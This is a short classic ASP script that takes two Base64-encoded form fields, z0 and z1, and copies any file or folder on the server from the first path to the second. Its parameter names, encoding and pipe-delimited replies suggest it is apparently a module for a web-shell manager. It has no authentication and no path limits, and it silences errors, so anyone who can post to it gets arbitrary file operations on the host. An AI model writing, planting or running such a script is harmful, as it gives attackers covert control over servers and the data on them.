<%

On Error Resume Next

Function GetCurrentCharset()
    Dim charset
    charset = Response.CharSet
    If charset = "" Then
        Select Case Session.CodePage
            Case 65001 : charset = "utf-8"
            Case 1252  : charset = "windows-1252"
            Case 936   : charset = "gb2312"
            Case 950   : charset = "big5"
            Case 1251  : charset = "windows-1251"
            Case Else  : charset = "utf-8"
        End Select
    End If
    GetCurrentCharset = charset
End Function

Function Base64Decode(str)
    If Trim(str) = "" Then
        Base64Decode = ""
        Exit Function
    End If

    Dim xml, node, stream
    Set xml = Server.CreateObject("MSXML2.DOMDocument.6.0")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.text = str

    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write node.nodeTypedValue
    stream.Position = 0
    stream.Type = 2
    stream.Charset = GetCurrentCharset()

    Base64Decode = stream.ReadText

    stream.Close
    Set stream = Nothing
    Set node = Nothing
    Set xml = Nothing
End Function

Function Main()
    Dim z0, z1
    z0 = Request.Form("z0")
    z1 = Request.Form("z1")
    
    If z0 = "" Or z1 = "" Then
        Main = "0|Missing parameters."
        Exit Function
    End If

    Dim src_path, dst_path
    src_path = Base64Decode(z0)
    dst_path = Base64Decode(z1)

    Dim fso
    Set fso = Server.CreateObject("Scripting.FileSystemObject")

    Dim srcExists
    srcExists = fso.FileExists(src_path) Or fso.FolderExists(src_path)

    If Not srcExists Then
        Main = "0|Source does not exist."
        Set fso = Nothing
        Exit Function
    End If

    Dim dstExists
    dstExists = fso.FileExists(dst_path) Or fso.FolderExists(dst_path)

    If dstExists Then
        Main = "0|Destination already exists."
        Set fso = Nothing
        Exit Function
    End If

    On Error Resume Next

    If fso.FolderExists(src_path) Then
        fso.CopyFolder src_path, dst_path, False
    Else
        fso.CopyFile src_path, dst_path, False
    End If

    If Err.Number = 0 Then
        Main = "1|"
    Else
        Main = "0|Error://" & Err.Description
    End If

    On Error GoTo 0
    Set fso = Nothing
End Function

Response.ContentType = "text/plain"
Response.Write Main()

%>